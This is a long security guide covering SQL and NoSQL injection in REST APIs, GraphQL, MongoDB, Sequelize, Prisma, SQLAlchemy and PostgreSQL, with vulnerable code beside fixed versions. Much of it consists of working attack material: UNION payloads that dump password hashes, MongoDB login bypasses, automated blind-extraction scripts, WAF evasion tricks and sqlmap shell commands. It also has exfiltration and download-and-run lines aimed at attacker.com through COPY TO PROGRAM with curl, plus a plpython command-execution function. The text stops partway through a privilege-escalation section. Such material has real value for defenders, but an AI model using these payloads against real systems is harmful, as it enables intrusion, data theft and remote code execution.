---
title: "SQL Injection and NoSQL Injection for Modern Applications: A Complete Exploitation and Defense Guide"
meta_description: "Comprehensive guide to SQL injection and NoSQL injection in modern REST APIs, GraphQL, ORMs, and document databases. Covers blind SQLi, UNION-based, second-order, MongoDB operator injection, ORM misuse in Sequelize/Prisma/SQLAlchemy, WAF bypasses, sqlmap for APIs, and PostgreSQL-specific techniques with real payloads and fixes."
slug: "sql-injection-nosql-injection-modern-applications"
keywords:
  - SQL injection
  - NoSQL injection
  - MongoDB injection
  - GraphQL SQL injection
  - blind SQL injection
  - UNION-based SQLi
  - second-order SQL injection
  - ORM injection
  - Sequelize raw query
  - SQLAlchemy injection
  - Prisma injection
  - WAF bypass SQL injection
  - sqlmap API testing
  - PostgreSQL injection
  - parameterized queries
  - JSON body SQL injection
  - bug bounty SQL injection
---

# SQL Injection and NoSQL Injection for Modern Applications: A Complete Exploitation and Defense Guide

## Introduction

SQL injection was first documented publicly in 1998. Nearly three decades later, it remains in the OWASP Top 10 and continues to be the root cause of some of the largest data breaches in history. The reason is not that we lack solutions -- parameterized queries have existed for decades. The reason is that modern application architectures introduce new injection surfaces faster than developers learn to defend them.

Today's injection landscape is fundamentally different from the classic `' OR 1=1 --` in a login form. Modern applications pass user input through REST API JSON bodies, GraphQL query variables, ORM method chains, and NoSQL query operators. Each of these surfaces has its own injection grammar, its own bypass techniques, and its own set of developer assumptions that attackers exploit.

This article is a complete offensive and defensive reference for injection attacks against modern application stacks. We will cover REST API SQL injection, GraphQL injection, all variants of blind SQLi, UNION-based extraction, second-order injection, MongoDB operator injection, ORM misuse in Node.js (Sequelize, Prisma) and Python (SQLAlchemy), error-based and out-of-band extraction, WAF bypass techniques, sqlmap usage for API testing, JSON body payloads, parameterized query patterns for correct fixes, and PostgreSQL-specific techniques.

Every payload in this article has been tested against real or lab-equivalent environments. Every code sample reflects patterns observed in production applications.

---

## 1. REST API SQL Injection

### The Modern Attack Surface

Classic SQL injection targeted HTML form parameters and URL query strings. Modern APIs accept structured JSON bodies, and developers often assume that JSON parsing provides some form of sanitization. It does not. The JSON parser converts the input to a native string, and if that string is concatenated into a SQL query, the injection vector is identical.

### JSON Body Injection

**Vulnerable Express.js endpoint:**

```javascript
const express = require('express');
const { Pool } = require('pg');
const app = express();
app.use(express.json());

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// VULNERABLE: String concatenation in SQL query
app.post('/api/users/search', async (req, res) => {
  const { username } = req.body;
  const query = `SELECT id, username, email FROM users WHERE username = '${username}'`;
  try {
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    // VULNERABLE: Error details leaked to client
    res.status(500).json({ error: err.message });
  }
});
```

**Exploitation via JSON body:**

```http
POST /api/users/search HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "' OR 1=1 --"}
```

The resulting query:
```sql
SELECT id, username, email FROM users WHERE username = '' OR 1=1 --'
```

This returns all users in the table.

**Data extraction:**

```http
POST /api/users/search HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "' UNION SELECT id, username, password_hash FROM users --"}
```

**Extracting database metadata:**

```json
{"username": "' UNION SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema='public' --"}
```

### Injection via Query Parameters in APIs

```http
GET /api/products?sort=name&order=ASC;DROP TABLE users-- HTTP/1.1
Host: target.com
```

Vulnerable code:

```javascript
// VULNERABLE: Dynamic ORDER BY from user input
app.get('/api/products', async (req, res) => {
  const { sort, order } = req.query;
  const query = `SELECT * FROM products ORDER BY ${sort} ${order}`;
  const result = await pool.query(query);
  res.json(result.rows);
});
```

ORDER BY and column name injection is common because parameterized queries cannot bind identifiers (table names, column names), only values. The fix requires an allowlist:

```javascript
// FIXED: Allowlist for sort columns and order direction
const ALLOWED_SORT_COLUMNS = ['name', 'price', 'created_at', 'rating'];
const ALLOWED_ORDER = ['ASC', 'DESC'];

app.get('/api/products', async (req, res) => {
  const sort = ALLOWED_SORT_COLUMNS.includes(req.query.sort) ? req.query.sort : 'name';
  const order = ALLOWED_ORDER.includes(req.query.order?.toUpperCase()) ? req.query.order.toUpperCase() : 'ASC';
  const query = `SELECT * FROM products ORDER BY ${sort} ${order}`;
  const result = await pool.query(query);
  res.json(result.rows);
});
```

---

## 2. GraphQL SQL Injection

### The Vulnerability

GraphQL APIs accept structured queries with variables. If the resolver concatenates these variables into SQL, the injection surface is the same as REST -- just accessed through a different transport.

**Vulnerable GraphQL resolver (Node.js with Apollo Server):**

```javascript
const resolvers = {
  Query: {
    user: async (_, { id }, { db }) => {
      // VULNERABLE: String interpolation in SQL
      const query = `SELECT * FROM users WHERE id = ${id}`;
      const result = await db.query(query);
      return result.rows[0];
    },
    searchUsers: async (_, { name }, { db }) => {
      // VULNERABLE: String concatenation
      const query = `SELECT * FROM users WHERE name LIKE '%${name}%'`;
      const result = await db.query(query);
      return result.rows;
    }
  }
};
```

**Exploitation:**

```graphql
query {
  user(id: "1 OR 1=1") {
    id
    username
    email
  }
}
```

```graphql
query {
  searchUsers(name: "' UNION SELECT id, username, password_hash, email FROM users --") {
    id
    username
    email
  }
}
```

**HTTP request:**

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "query": "query($name: String!) { searchUsers(name: $name) { id username email } }",
  "variables": {
    "name": "' UNION SELECT id, username, password_hash, email FROM users --"
  }
}
```

### Fixed Code

```javascript
const resolvers = {
  Query: {
    user: async (_, { id }, { db }) => {
      // FIXED: Parameterized query
      const result = await db.query(
        'SELECT * FROM users WHERE id = $1',
        [id]
      );
      return result.rows[0];
    },
    searchUsers: async (_, { name }, { db }) => {
      // FIXED: Parameterized LIKE query
      const result = await db.query(
        'SELECT * FROM users WHERE name LIKE $1',
        [`%${name}%`]
      );
      return result.rows;
    }
  }
};
```

### GraphQL Introspection for Reconnaissance

Before injecting, enumerate the schema:

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        args {
          name
          type { name kind }
        }
      }
    }
  }
}
```

This reveals every query, mutation, and their argument types -- the attack surface map.

---

## 3. Blind SQL Injection

### Boolean-Based Blind SQLi

When the application does not display query results or error messages but behaves differently based on whether the injected condition is true or false, boolean-based blind injection is possible.

**Vulnerable endpoint:**

```javascript
app.get('/api/user/:id', async (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
  const result = await pool.query(query);
  if (result.rows.length > 0) {
    res.json({ exists: true });
  } else {
    res.json({ exists: false });
  }
});
```

**Extracting data one bit at a time:**

```http
GET /api/user/1 AND (SELECT SUBSTRING(password_hash,1,1) FROM users WHERE id=1)='$' HTTP/1.1
```

**Extracting the database version character by character:**

```http
GET /api/user/1 AND ASCII(SUBSTRING((SELECT version()),1,1))>80 HTTP/1.1
```

If the response is `{"exists": true}`, the first character's ASCII value is greater than 80. Use binary search to narrow down each character.

**Automated extraction script:**

```python
import requests
import string

url = "https://target.com/api/user/1"
extracted = ""
charset = string.printable

for position in range(1, 100):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        # PostgreSQL syntax
        payload = f"1 AND ASCII(SUBSTRING((SELECT password_hash FROM users LIMIT 1),{position},1))>{mid}"
        r = requests.get(f"{url.replace('/1', '/' + payload)}")

        if '"exists": true' in r.text:
            low = mid + 1
        else:
            high = mid - 1

    if low > 126:
        break
    extracted += chr(low)
    print(f"[*] Extracted so far: {extracted}")
```

### Time-Based Blind SQLi

When there is no observable difference in the response (same status code, same body), use time delays.

**PostgreSQL time-based payloads:**

```http
GET /api/user/1; SELECT CASE WHEN (SELECT SUBSTRING(password_hash,1,1) FROM users WHERE id=1)='$' THEN pg_sleep(3) ELSE pg_sleep(0) END-- HTTP/1.1
```

```
# If the server takes ~3 seconds to respond, the condition is true
1; SELECT pg_sleep(3)--
1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
1; SELECT CASE WHEN (SELECT COUNT(*) FROM users)>10 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Conditional time-based for data extraction:**

```sql
-- Extract admin password hash character by character
1; SELECT CASE WHEN ASCII(SUBSTRING((SELECT password_hash FROM users WHERE username='admin'),1,1))>80 THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

---

## 4. UNION-Based SQL Injection

### Methodology

UNION-based injection requires matching the number of columns and compatible data types between the original query and the injected SELECT.

**Step 1: Determine column count with ORDER BY**

```
' ORDER BY 1-- (success)
' ORDER BY 2-- (success)
' ORDER BY 3-- (success)
' ORDER BY 4-- (error: column 4 does not exist)
```

The original query has 3 columns.

**Step 2: Find displayable columns with NULL placeholders**

```json
{"username": "' UNION SELECT NULL, NULL, NULL--"}
```

Then identify which columns appear in the response:

```json
{"username": "' UNION SELECT 'test1', 'test2', 'test3'--"}
```

**Step 3: Extract data**

```json
{"username": "' UNION SELECT username, password_hash, email FROM users--"}
```

**Step 4: Extract from system tables (PostgreSQL)**

```json
{"username": "' UNION SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema='public'--"}
```

```json
{"username": "' UNION SELECT schemaname, tablename, tableowner FROM pg_tables WHERE schemaname='public'--"}
```

**Step 5: Read files (PostgreSQL)**

```json
{"username": "' UNION SELECT pg_read_file('/etc/passwd'), NULL, NULL--"}
```

**Step 6: Stacked queries for write operations (if supported)**

```json
{"username": "'; INSERT INTO users (username, password_hash, role) VALUES ('backdoor', '$2b$10$...', 'admin')--"}
```

### Realistic HTTP Request

```http
POST /api/users/search HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

{
  "username": "' UNION SELECT id::text, username, password_hash FROM users--"
}
```

---

## 5. Second-Order SQL Injection

### The Vulnerability

Second-order (stored) SQL injection occurs when user input is safely stored in the database via parameterized queries, but later retrieved and concatenated unsafely into a different SQL query.

### Attack Flow

1. Attacker registers with username: `admin'--`
2. The registration query is parameterized -- the value is stored safely.
3. Later, a background job or admin feature queries:
   ```sql
   SELECT * FROM orders WHERE customer_name = '${user.username}'
   ```
4. The stored malicious username is now interpolated unsafely.

### Realistic Scenario

**Step 1: Store the payload (safe insertion)**

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "admin'-- ",
  "email": "attacker@evil.com",
  "password": "SecurePass123!"
}
```

```javascript
// This is SAFE - parameterized insert
await pool.query(
  'INSERT INTO users (username, email, password_hash) VALUES ($1, $2, $3)',
  [username, email, hashedPassword]
);
```

**Step 2: Trigger the second query (unsafe usage)**

```javascript
// VULNERABLE: Uses the stored username in string concatenation
app.get('/api/user/:id/orders', async (req, res) => {
  // Fetch user from DB (this query is safe)
  const userResult = await pool.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
  const user = userResult.rows[0];

  // VULNERABLE: Uses stored value unsafely
  const ordersQuery = `SELECT * FROM orders WHERE customer_name = '${user.username}'`;
  const orders = await pool.query(ordersQuery);
  res.json(orders.rows);
});
```

The stored username `admin'--` turns the query into:
```sql
SELECT * FROM orders WHERE customer_name = 'admin'--'
```

This returns all orders for the `admin` user.

### More Dangerous Payload

Register with username:
```
' UNION SELECT id, username, password_hash, email, role FROM users--
```

When this value is later interpolated into the orders query, it dumps the entire users table.

### Prevention

The fix is simple but requires discipline: **every** SQL query must use parameterized bindings, even when the data comes from your own database.

```javascript
// FIXED: Parameterized even though the data comes from the DB
const ordersQuery = 'SELECT * FROM orders WHERE customer_name = $1';
const orders = await pool.query(ordersQuery, [user.username]);
```

---

## 6. MongoDB Query Injection (NoSQL Injection)

### The Vulnerability

MongoDB queries use JSON-like documents. When user input is parsed from a JSON request body and passed directly to MongoDB query methods, attackers can inject MongoDB query operators.

### Operator Injection

**Vulnerable Express.js code with MongoDB:**

```javascript
const { MongoClient } = require('mongodb');

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // VULNERABLE: Direct pass-through of user input to MongoDB query
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });

  if (user) {
    res.json({ message: 'Login successful', token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Authentication bypass with `$ne` (not equal):**

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

The MongoDB query becomes:
```javascript
db.collection('users').findOne({
  username: { $ne: "" },  // any non-empty username
  password: { $ne: "" }   // any non-empty password
});
```

This returns the first user in the collection (often admin).

**Authentication bypass with `$gt` (greater than):**

```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```

Any non-empty password is "greater than" an empty string, so this always matches the admin user.

**Extracting data with `$regex`:**

```json
{
  "username": "admin",
  "password": {"$regex": "^a"}
}
```

If the response indicates success, the admin password starts with `a`. Continue character by character:

```python
import requests
import string

url = "https://target.com/api/login"
password = ""
charset = string.ascii_lowercase + string.digits + string.punctuation

for position in range(50):
    found = False
    for char in charset:
        # Escape regex special characters
        escaped = char
        if char in r'\.^$*+?{}[]|()':
            escaped = '\\' + char

        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{escaped}"}
        }
        r = requests.post(url, json=payload)

        if r.status_code == 200:
            password += char
            print(f"[*] Password so far: {password}")
            found = True
            break

    if not found:
        break

print(f"[+] Complete password: {password}")
```

### `$where` Injection

Some applications use MongoDB's `$where` operator with JavaScript expressions:

```javascript
// VULNERABLE: $where with user input
const results = await db.collection('users').find({
  $where: `this.username == '${username}'`
}).toArray();
```

**Injection:**

```json
{"username": "'; return true; //"}
```

**Time-based blind extraction:**

```json
{"username": "'; if(this.password.startsWith('admin'))sleep(5000); //"}
```

### Prevention

```javascript
// FIXED: Type-check inputs before passing to MongoDB
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // Ensure inputs are strings, not objects
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input type' });
  }

  // Compare against hashed password, never plain text
  const user = await db.collection('users').findOne({ username });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ token: generateToken(user) });
});
```

**Using mongo-sanitize to strip operators:**

```javascript
const sanitize = require('mongo-sanitize');

app.post('/api/login', async (req, res) => {
  // Strips any keys starting with $ from the input
  const cleanBody = sanitize(req.body);
  const { username, password } = cleanBody;
  // ...
});
```

**Using JSON Schema validation (Express with ajv):**

```javascript
const Ajv = require('ajv');
const ajv = new Ajv();

const loginSchema = {
  type: 'object',
  properties: {
    username: { type: 'string', minLength: 1, maxLength: 50 },
    password: { type: 'string', minLength: 1, maxLength: 128 }
  },
  required: ['username', 'password'],
  additionalProperties: false
};

const validateLogin = ajv.compile(loginSchema);

app.post('/api/login', (req, res, next) => {
  if (!validateLogin(req.body)) {
    return res.status(400).json({ errors: validateLogin.errors });
  }
  next();
}, loginHandler);
```

---

## 7. ORM Misuse in Node.js

### Sequelize Raw Queries

ORMs prevent injection when used correctly, but every ORM provides raw query escape hatches that developers misuse.

```javascript
const { Sequelize } = require('sequelize');
const sequelize = new Sequelize(process.env.DATABASE_URL);

// VULNERABLE: String interpolation in raw query
app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const users = await sequelize.query(
    `SELECT * FROM users WHERE username LIKE '%${search}%'`
  );
  res.json(users[0]);
});

// VULNERABLE: Template literal in raw query
app.get('/api/user/:id', async (req, res) => {
  const users = await sequelize.query(
    `SELECT * FROM users WHERE id = ${req.params.id}`
  );
  res.json(users[0][0]);
});
```

**Fixed with Sequelize replacements:**

```javascript
// FIXED: Using replacements (parameterized)
app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const users = await sequelize.query(
    'SELECT * FROM users WHERE username LIKE :search',
    {
      replacements: { search: `%${search}%` },
      type: Sequelize.QueryTypes.SELECT
    }
  );
  res.json(users);
});

// FIXED: Using bind parameters
app.get('/api/user/:id', async (req, res) => {
  const users = await sequelize.query(
    'SELECT * FROM users WHERE id = $1',
    {
      bind: [req.params.id],
      type: Sequelize.QueryTypes.SELECT
    }
  );
  res.json(users[0]);
});
```

**Fixed using Sequelize model methods (preferred):**

```javascript
const { Op } = require('sequelize');

app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const users = await User.findAll({
    where: {
      username: {
        [Op.iLike]: `%${search}%`
      }
    },
    attributes: ['id', 'username', 'email'] // explicit column selection
  });
  res.json(users);
});
```

### Sequelize Operator Injection

Older versions of Sequelize (before v5) allowed operator aliases by default, enabling injection through JSON:

```javascript
// Sequelize v4 - VULNERABLE by default
// If the app passes req.body directly to a where clause:
app.post('/api/users/search', async (req, res) => {
  const users = await User.findAll({ where: req.body });
  res.json(users);
});
```

Attack payload:

```json
{
  "role": "user",
  "password": { "$ne": "" }
}
```

In Sequelize v4 with operator aliases, `$ne` maps to `Op.ne`, returning all users where the password is not empty (all users).

Fix: Sequelize v5+ disabled operator aliases by default. If using an older version:

```javascript
const sequelize = new Sequelize(process.env.DATABASE_URL, {
  operatorsAliases: false // Disable string operator aliases
});
```

### Prisma Raw Queries

Prisma is generally safer because its query builder is type-safe. However, `$queryRaw` and `$executeRaw` accept raw SQL:

```javascript
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

// VULNERABLE: String interpolation in raw query
app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const users = await prisma.$queryRawUnsafe(
    `SELECT * FROM users WHERE username LIKE '%${search}%'`
  );
  res.json(users);
});
```

**Fixed: Using Prisma's tagged template (automatically parameterized):**

```javascript
// FIXED: Tagged template literal - Prisma parameterizes automatically
app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const users = await prisma.$queryRaw`
    SELECT * FROM users WHERE username LIKE ${`%${search}%`}
  `;
  res.json(users);
});

// EVEN BETTER: Use Prisma's query builder
app.get('/api/users', async (req, res) => {
  const { search } = req.query;
  const users = await prisma.user.findMany({
    where: {
      username: { contains: search, mode: 'insensitive' }
    },
    select: { id: true, username: true, email: true }
  });
  res.json(users);
});
```

Critical distinction: `$queryRaw` with tagged templates is SAFE. `$queryRawUnsafe` with string concatenation is VULNERABLE. The function names make this explicit.

---

## 8. ORM Misuse in FastAPI (SQLAlchemy)

### Vulnerable Patterns

```python
from fastapi import FastAPI, Query
from sqlalchemy import create_engine, text
from sqlalchemy.orm import Session

app = FastAPI()
engine = create_engine("postgresql://user:pass@localhost/mydb")

# VULNERABLE: f-string in raw SQL
@app.get("/api/users")
def search_users(search: str = Query(...)):
    with Session(engine) as session:
        result = session.execute(
            text(f"SELECT * FROM users WHERE username LIKE '%{search}%'")
        )
        return [dict(row._mapping) for row in result]

# VULNERABLE: .format() in raw SQL
@app.get("/api/user/{user_id}")
def get_user(user_id: int):
    with Session(engine) as session:
        query = "SELECT * FROM users WHERE id = {}".format(user_id)
        result = session.execute(text(query))
        return dict(result.fetchone()._mapping)
```

### Fixed Code

```python
from fastapi import FastAPI, Query, HTTPException
from sqlalchemy import create_engine, text, select
from sqlalchemy.orm import Session, DeclarativeBase, Mapped, mapped_column

app = FastAPI()
engine = create_engine("postgresql://user:pass@localhost/mydb")

# FIXED: Bound parameters with SQLAlchemy text()
@app.get("/api/users")
def search_users(search: str = Query(..., min_length=1, max_length=100)):
    with Session(engine) as session:
        result = session.execute(
            text("SELECT id, username, email FROM users WHERE username LIKE :search"),
            {"search": f"%{search}%"}
        )
        return [dict(row._mapping) for row in result]

# FIXED: Using SQLAlchemy ORM models (preferred)
class Base(DeclarativeBase):
    pass

class User(Base):
    __tablename__ = "users"
    id: Mapped[int] = mapped_column(primary_key=True)
    username: Mapped[str]
    email: Mapped[str]
    password_hash: Mapped[str]
    role: Mapped[str]

@app.get("/api/users/orm")
def search_users_orm(search: str = Query(..., min_length=1, max_length=100)):
    with Session(engine) as session:
        stmt = select(User.id, User.username, User.email).where(
            User.username.ilike(f"%{search}%")
        )
        result = session.execute(stmt)
        return [dict(row._mapping) for row in result]

# FIXED: Parameterized with FastAPI's path parameter validation
@app.get("/api/user/{user_id}")
def get_user(user_id: int):  # FastAPI validates this is an integer
    with Session(engine) as session:
        result = session.execute(
            text("SELECT id, username, email FROM users WHERE id = :id"),
            {"id": user_id}
        )
        row = result.fetchone()
        if not row:
            raise HTTPException(status_code=404, detail="User not found")
        return dict(row._mapping)
```

### SQLAlchemy `filter()` Misuse

Even the ORM query builder can be misused:

```python
# VULNERABLE: String-based filter expression
@app.get("/api/users/filter")
def filter_users(condition: str = Query(...)):
    with Session(engine) as session:
        # Never pass user input to filter() as a string expression
        result = session.query(User).filter(text(condition)).all()
        return result
```

Attack:
```
GET /api/users/filter?condition=1=1
GET /api/users/filter?condition=role='admin'
```

Fix: never allow user input to control filter expressions. Map user input to pre-defined filter conditions:

```python
ALLOWED_FILTERS = {
    "active": User.is_active == True,
    "admin": User.role == "admin",
    "recent": User.created_at > func.now() - timedelta(days=7),
}

@app.get("/api/users/filter")
def filter_users(filter_name: str = Query(...)):
    condition = ALLOWED_FILTERS.get(filter_name)
    if not condition:
        raise HTTPException(status_code=400, detail="Invalid filter")
    with Session(engine) as session:
        result = session.query(User).filter(condition).all()
        return result
```

---

## 9. Error-Based SQL Injection

### The Technique

Error-based SQLi extracts data through database error messages that are reflected to the client. This is faster than blind injection because full values can be extracted in a single request.

### PostgreSQL Error-Based Payloads

**CAST error extraction:**

```json
{"username": "' AND 1=CAST((SELECT version()) AS int)--"}
```

Error response:
```json
{
  "error": "invalid input syntax for type integer: \"PostgreSQL 15.4 on x86_64-pc-linux-gnu\""
}
```

The database version is leaked in the error message.

**Extracting table names:**

```json
{"username": "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0) AS int)--"}
```

Error: `invalid input syntax for type integer: "users"`

**Extracting column names:**

```json
{"username": "' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) AS int)--"}
```

**Extracting actual data:**

```json
{"username": "' AND 1=CAST((SELECT password_hash FROM users WHERE username='admin') AS int)--"}
```

Error: `invalid input syntax for type integer: "$2b$10$rqz..."`

### XML Error Extraction (PostgreSQL)

```sql
' AND extractvalue(1, concat(0x7e, (SELECT version()))) --
```

### Prevention

Never expose raw database errors to clients:

```javascript
// VULNERABLE: Raw error forwarded
app.post('/api/search', async (req, res) => {
  try {
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message }); // Leaks DB info
  }
});

// FIXED: Generic error message
app.post('/api/search', async (req, res) => {
  try {
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    logger.error('Database query failed', { error: err.message, query: 'redacted' });
    res.status(500).json({ error: 'Internal server error' });
  }
});
```

---

## 10. Out-of-Band SQL Injection

### The Technique

When the application returns no data, no errors, and has no observable timing differences (true blind with no side channel), out-of-band (OOB) techniques exfiltrate data through external channels -- typically DNS or HTTP.

### PostgreSQL OOB via `COPY TO PROGRAM`

```sql
'; COPY (SELECT password_hash FROM users WHERE username='admin') TO PROGRAM 'curl https://attacker.com/exfil?data=$(cat -)' --
```

### PostgreSQL OOB via `dblink`

```sql
'; SELECT dblink_connect('host=attacker.com dbname=' || (SELECT password_hash FROM users LIMIT 1)) --
```

### PostgreSQL OOB via Large Objects

```sql
-- Create a large object from a query result
'; SELECT lo_import('/etc/passwd'); --

-- Exfiltrate via DNS
'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink('dbname=postgres', 'SELECT version()') --
```

### DNS Exfiltration Detection

Monitor your DNS server for incoming queries:

```bash
# On attacker's DNS server
sudo tcpdump -i eth0 port 53

# The exfiltrated data appears as a subdomain:
# query: sensitive-data-here.attacker.com
```

### Using Burp Collaborator for OOB Detection

1. Generate a Burp Collaborator payload: `xyz123.burpcollaborator.net`
2. Inject DNS lookup payload:
   ```sql
   '; COPY (SELECT '') TO PROGRAM 'nslookup xyz123.burpcollaborator.net' --
   ```
3. Check Collaborator tab for DNS/HTTP interactions.

---

## 11. WAF Bypass Techniques

### Common WAF Evasions

Web Application Firewalls typically look for SQL keywords and patterns. Attackers use various encoding and syntax tricks to evade detection.

**Case manipulation:**

```sql
SeLeCt * FrOm users
```

**Comments as whitespace:**

```sql
SELECT/**/username/**/FROM/**/users
UNI/**/ON/**/SEL/**/ECT/**/1,2,3
```

**Inline comments (MySQL):**

```sql
/*!50000SELECT*/ * FROM users
```

**URL encoding:**

```
%53%45%4C%45%43%54  (SELECT)
%27%20%4F%52%20%31%3D%31%20%2D%2D  (' OR 1=1 --)
```

**Double URL encoding:**

```
%2553%2545%254C%2545%2543%2554  (SELECT, double-encoded)
```

**Unicode/overlong encoding:**

```
%u0053%u0045%u004C%u0045%u0043%u0054  (SELECT)
```

**String concatenation bypass:**

```sql
-- PostgreSQL
SELECT 'ad' || 'min' -- bypasses keyword filters on 'admin'
SELECT CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84) -- SELECT
```

**Alternative syntax:**

```sql
-- Instead of UNION SELECT
1; SELECT * FROM users  -- stacked query

-- Instead of OR 1=1
OR 'a'='a'
OR 1 LIKE 1
OR 1 BETWEEN 0 AND 2

-- Instead of quotes
SELECT username FROM users WHERE id = 1 -- no quotes needed for integers
```

**HTTP parameter pollution:**

```
POST /api/search HTTP/1.1
Content-Type: application/json

{"username": "admin", "username": "' OR 1=1--"}
```

Some parsers take the first value (safe), some take the last (injected), some merge them.

**JSON-specific bypasses:**

```json
{"username": ["' OR 1=1--"]}
{"username": {"$gt": ""}}
{"id": {"toString": ""}}
```

**Newline injection:**

```sql
SELECT
username
FROM
users
```

Some WAFs only match single-line patterns.

**Scientific notation for numeric filters:**

```
1e0 UNION SELECT 1,2,3
```

### Testing WAF Bypass Systematically

```bash
# Use sqlmap with tamper scripts
sqlmap -u "https://target.com/api/users?id=1" \
  --tamper=space2comment,between,randomcase \
  --random-agent \
  --delay=2

# Available tamper scripts for specific WAFs:
# --tamper=charencode          # URL-encodes all characters
# --tamper=space2comment       # Replaces spaces with /**/
# --tamper=between             # Replaces > with BETWEEN
# --tamper=randomcase          # Random case for keywords
# --tamper=space2hash          # Replaces spaces with # and newline
# --tamper=equaltolike         # Replaces = with LIKE
# --tamper=percentage          # Adds % between characters
```

---

## 12. sqlmap for API Testing

### JSON Body Injection

```bash
# Test a JSON body parameter
sqlmap -u "https://target.com/api/users/search" \
  --method POST \
  --data='{"username":"test","role":"user"}' \
  --headers="Content-Type: application/json\nAuthorization: Bearer <token>" \
  -p username \
  --dbms=postgresql \
  --level=3 \
  --risk=2

# Specify the injection point with *
sqlmap -u "https://target.com/api/users/search" \
  --method POST \
  --data='{"username":"test*","role":"user"}' \
  --headers="Content-Type: application/json"
```

### REST API Path Parameters

```bash
# Test path parameter injection
sqlmap -u "https://target.com/api/user/1*" \
  --headers="Authorization: Bearer <token>" \
  --dbms=postgresql
```

### GraphQL Injection with sqlmap

```bash
# Save the GraphQL request from Burp to a file
sqlmap -r graphql_request.txt \
  --dbms=postgresql \
  --level=5 \
  --risk=3 \
  --technique=BEUSTQ
```

Content of `graphql_request.txt`:

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

{"query":"query { user(id: \"1*\") { id username email } }"}
```

### Enumeration After Confirming Injection

```bash
# Enumerate databases
sqlmap -u "https://target.com/api/users/search" \
  --method POST \
  --data='{"username":"test"}' \
  --headers="Content-Type: application/json" \
  -p username \
  --dbs

# Enumerate tables in a specific database
sqlmap ... --tables -D myapp

# Dump specific columns from a table
sqlmap ... --dump -D myapp -T users -C username,password_hash,email

# Get a shell (if stacked queries are supported)
sqlmap ... --os-shell

# Read a file from the server
sqlmap ... --file-read=/etc/passwd

# Execute SQL query interactively
sqlmap ... --sql-shell
```

### Evading Rate Limits and Detection

```bash
sqlmap ... \
  --delay=3 \                    # 3 seconds between requests
  --random-agent \               # Rotate User-Agent
  --proxy=http://127.0.0.1:8080 \ # Route through Burp
  --tor \                        # Route through Tor
  --tamper=space2comment \       # WAF bypass
  --technique=T \                # Time-based only (stealthier)
  --time-sec=5                   # Sleep time for time-based
```

---

## 13. PostgreSQL-Specific Injection Techniques

### System Information Extraction

```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;
SELECT session_user;

-- Current database
SELECT current_database();

-- All databases
SELECT datname FROM pg_database;

-- Server IP
SELECT inet_server_addr();

-- Server port
SELECT inet_server_port();

-- Data directory
SELECT setting FROM pg_settings WHERE name = 'data_directory';

-- Config file location
SELECT setting FROM pg_settings WHERE name = 'config_file';
```

### File System Access

```sql
-- Read files (requires superuser or pg_read_server_files role)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/hostname');

-- Read with offset and length
SELECT pg_read_file('/etc/passwd', 0, 100);

-- Read binary files
SELECT encode(pg_read_binary_file('/etc/passwd'), 'base64');

-- List directory contents
SELECT pg_ls_dir('/etc');

-- File stats
SELECT * FROM pg_stat_file('/etc/passwd');
```

### Command Execution

```sql
-- Via COPY TO PROGRAM (PostgreSQL 9.3+, requires superuser)
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
COPY (SELECT '') TO PROGRAM 'curl https://attacker.com/shell.sh | bash';

-- Via user-defined functions (requires CREATE privilege)
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT cmd_exec('id');
SELECT cmd_exec('cat /etc/passwd');

-- Via large objects
SELECT lo_import('/etc/passwd', 12345);
SELECT convert_from(lo_get(12345), 'UTF-8');
```

### Privilege Escalation

```sql
-- Check if superuser
SELECT usesuper FROM pg_user WHERE usename = current_user;

-- Check roles
SELECT rolname, rolsuper, rolcreatedb, rolcreaterole FROM pg_roles;

